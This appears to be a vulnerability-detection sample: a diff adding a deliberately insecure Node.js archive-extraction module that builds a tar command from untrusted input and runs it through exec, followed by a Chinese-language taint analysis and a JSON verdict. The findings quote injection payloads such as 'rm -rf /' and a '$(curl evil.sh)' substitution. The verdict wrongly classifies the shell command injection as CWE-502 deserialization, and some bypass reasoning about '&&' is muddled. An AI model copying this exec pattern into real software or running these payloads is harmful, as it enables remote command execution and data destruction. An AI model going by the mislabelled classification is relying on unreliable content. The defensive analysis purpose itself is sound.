@@ -1,0 +1,48 @@
+LANG: javascript
+```javascript
+// archive-loader.js — 归档解包工具模块，被上层服务调用（如消费队列消息后传入归档名）
+'use strict';
+
+const fs = require('fs');
+const path = require('path');
+const { exec } = require('child_process');
+
+// 弱防御：仅黑名单过滤常见危险字符
+function sanitizeArchiveName(name) {
+  const blacklist = [';', '|', '&', '`'];
+  let cleaned = name;
+  for (const ch of blacklist) {
+    cleaned = cleaned.split(ch).join('');
+  }
+  return cleaned;
+}
+
+/**
+ * 解包指定归档文件。archiveName 由上层调用者直接传入（外部提交的归档名）。
+ */
+function extractArchive(archiveName, destDir) {
+  // 仅做扩展名校验，未限制实际内容
+  if (!archiveName.endsWith('.tar.gz')) {
+    throw new Error('unsupported archive type');
+  }
+  const safeName = sanitizeArchiveName(archiveName);
+  const cmd = `tar -xzf ${safeName} -C ${destDir}`;
+  exec(cmd, (err, stdout, stderr) => {
+    if (err) console.error('extract failed:', stderr);
+  });
+}
+
+module.exports = { extractArchive };
+```
+
+1. 第 1 行污点边界：本文件无 request/argv/stdin 等显式 web 入口，但第 20 行公开函数 extractArchive 的参数 archiveName 承载上层调用者/队列消息传入的外部提交归档名，按不可信数据处理，是等效污点源。
+2. 第 22-24 行：仅 endsWith('.tar.gz') 校验，攻击者可构造 `evil.tar.gz; rm -rf /` 之类以 .tar.gz 结尾的字符串通过校验，校验不构成有效防御。
+3. 第 10-16 行 sanitizeArchiveName 为黑名单字符串替换，仅删除 ; | & ` 四个字符，可被绕过：使用换行符 `
+`、`$()` 命令替换、或 `&&` 中删除一个 & 后剩余单个 & 无害但可用 `$(` 直接注入子命令，例如 `a.tar.gz$(curl evil.sh)` 完整保留。
+4. 第 26 行拼接命令字符串，第 27 行 exec(cmd) 是 CWE-502 对应的危险 sink——将不可信数据作为 shell 命令执行；从参数到 sink 全程无有效防御，污点可达。
+5. 第二入口检查：本文件仅导出 extractArchive 一个入口，destDir 参数同样拼入命令（第 26 行）构成第二条 source→sink 流，但同属本函数参数；无其他路由或间接调用通道。
+6. 结论：存在漏洞，外部可控参数直达 shell 命令执行 sink。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-502 反序列化不可信数据/命令注入式不安全反序列化", "risk_level": "Critical", "source": "line 20: extractArchive 参数 archiveName 与 destDir（上层调用者传入的外部提交归档名）", "sink": "line 27: exec(cmd) 将拼接后的不可信字符串作为 shell 命令执行", "explanation": "流1: line 20 archiveName -> line 23 endsWith 校验可被以 .tar.gz 结尾的恶意串绕过 -> line 25 黑名单替换仅删 ;|&` 四字符，$() 或换行符可绕过 -> line 26 拼入模板串 -> line 27 exec 执行; 流2: line 20 destDir 未做任何处理 -> line 26 拼接 -> line 27 exec 同样可达; 第二入口检查: 文件仅导出 extractArchive，无其他路由或间接调用通道，两条参数流均直达 sink 且全程无有效防御", "fix_suggestion": "line 27: 改用 execFile('tar', ['-xzf', archiveName, '-C', destDir]) 以数组参数形式调用并白名单校验归档名格式，避免 shell 解释"}
+```
